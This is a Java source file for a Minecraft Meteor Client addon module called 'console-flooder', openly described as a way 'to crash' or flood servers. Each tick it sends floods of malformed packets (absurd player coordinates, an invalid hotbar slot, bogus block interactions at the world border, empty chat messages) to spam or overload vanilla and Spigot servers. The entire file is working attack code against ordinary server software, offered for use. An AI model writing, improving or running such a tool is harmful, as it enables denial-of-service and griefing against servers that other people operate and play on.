package me.soda.jesus.modules;

import me.soda.jesus.Addon;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

public class ConsoleFlood extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("how to crash")
        .defaultValue(Modes.Movement)
        .build());

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("packets/tick")
        .defaultValue(1)
        .sliderRange(1, 20)
        .build());

    public ConsoleFlood() {
        super(Addon.CATEGORY, "console-flooder", "floods the console (some only work on vanilla/spigot)");
    }

    int timer = 0;

    @EventHandler
    private void onTick(TickEvent.Post event) {
        switch (mode.get()) {
            case Movement -> {
                for (int i = 0; i < amount.get(); i++) {
                    mc.player.setPos(1333333337, 1333333337, 1333333337);
                }
            }
            case Chat -> {
                if (mc.player.hasPermissionLevel(4)) {
                    for (int i = 0; i < amount.get(); i++) {
                        ChatUtils.sendPlayerMsg("");
                    }
                } else {
                    timer++;
                    if (timer == 12) {
                        ChatUtils.sendPlayerMsg("");
                        timer = 0;
                    }
                }
            }
            case Sequence -> {
                Vec3d asdf = mc.crosshairTarget.getPos();
                for (int i = 0; i < amount.get(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(asdf, Direction.DOWN, new BlockPos(asdf), false), -1));
                }
            }
            case Slot -> {
                for (int i = 0; i < amount.get(); i++) {
                    mc.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(69));
                }
            }
            case Interact -> {
                Vec3d ppos = new Vec3d(30000000, 255, 30000000);
                BlockHitResult bhr = new BlockHitResult(ppos, Direction.DOWN, new BlockPos(ppos), false);
                for (int i = 0; i < amount.get(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, 0));
                }
            }
        }
    }

    public enum Modes {
        Movement, Chat, Sequence, Slot, Interact
    }
}
